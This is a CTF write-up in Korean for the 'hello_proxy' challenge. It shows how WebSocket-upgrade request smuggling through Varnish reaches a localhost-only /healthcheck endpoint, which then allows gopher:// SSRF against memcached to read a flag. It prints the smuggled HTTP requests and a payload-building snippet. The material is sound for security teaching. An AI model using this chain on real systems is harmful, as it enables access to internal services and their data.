# hello_proxy

# Usage

# Concept

- Request Smuggling, SSRF

# Writeup

처음 docker-compose.yml 파일에서 fastapi 웹 어플리케이션, cache proxy인 varnish, cache db인 memcached, 총 3개의 서비스가 동작하는 것을 확인할 수 있다.

`app/main.py`에서 플래그를 환경 변수에서 불러와 memcached db에 저장한다. 여기서 최종 목표는 memcached db에 저장된 플래그를 읽는 것이라는 걸 알 수 있다.

```python
...
client = Client("memcached")
client.set("flag", FLAG)


@app.get("/")
def read_root():
    client.set("flag", FLAG)
    return {"Hello": "Proxy"}
...
```

`varnish/default.vcl`에서 sub vcl_recv 부분을 보면 `/healthcheck` 경로는 localhost로만 접근이 가능하게 필터링 되어 있다.

```vcl
...
sub vcl_recv {
    if ( req.url ~ "^/healthcheck" && !(client.ip ~ whitelist) ) {
        return (synth(403, "Forbidden"));
    }
}
...
```

이것을 우회하기 위해서는 Websocket을 통한 Request Smuggling 기법을 사용해야 한다.

varnish에서는 Websocket 통신을 할 떄, Websocket에서 Client와 Server가 제대로 연결되었는지 충분한 검증을 하지 않기 때문에 Server에서 4xx Response를 반환해도 Websocket 연결이 된 것으로 간주하고 TCP 연결이 지속된다.

따라서, 기존에는 접속이 불가능한 `/healthcheck`가 http임에도 불구하고 내부에서 tcp 통신하는 것처럼 localhost로 보내기 때문에 `/healthcheck` 엔드포인드에 접근이 가능해지게 된다.

```
GET /ws HTTP/1.1
Host: localhost
Upgrade: websocket

GET /healthcheck?check_url=gopher://memcached:11211/_{command} HTTP/1.1
Host: localhost
```

이후, `/healthcheck`에서 SSRF가 가능한 것을 알 수 있다. Curl을 사용하고 있기 때문에, gopher 프로토콜을 이용한 memcached SSRF가 가능하다. 한가지 주의할 점은 gopher payload에 quit을 넣어주지 않으면 버퍼가 끝나지 않기 때문에 request가 hang 걸려서 죽게 된다.

```python
@app.get("/healthcheck")
def healthcheck(check_url: str):
    if not check_url:
        return {"status": 400, "response": "Invalid URL"}

    try:
        print("healthcheck: ", check_url)
        c = pycurl.Curl()
        response_buffer = BytesIO()
        c.setopt(c.URL, check_url)
        c.setopt(c.WRITEDATA, response_buffer)
        c.perform()
        return {
            "status": c.getinfo(pycurl.RESPONSE_CODE),
            "response": response_buffer.getvalue().decode(),
        }
    except Exception as e:
        print(e)
        return {"status": 500, "response": "Error"}
```

gopher ssrf payload는 다음과 같다.

```python
req2 = f'''GET /healthcheck?check_url=gopher://memcached:11211/_{command} HTTP/1.1
Host: localhost

'''.replace('\n', '\r\n')
```

flag: `hspace{f8c7dd6f437f95725cd3dacb3403c9de}`
